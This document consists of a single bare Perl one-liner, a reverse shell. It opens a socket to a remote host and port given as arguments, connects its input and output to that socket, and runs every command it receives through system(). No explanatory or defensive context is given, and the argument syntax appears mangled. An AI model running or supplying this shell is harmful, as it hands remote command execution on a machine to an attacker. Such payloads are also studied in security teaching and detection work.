perl -MIO::Socket -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$$ARGV1:$$ARGV2");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
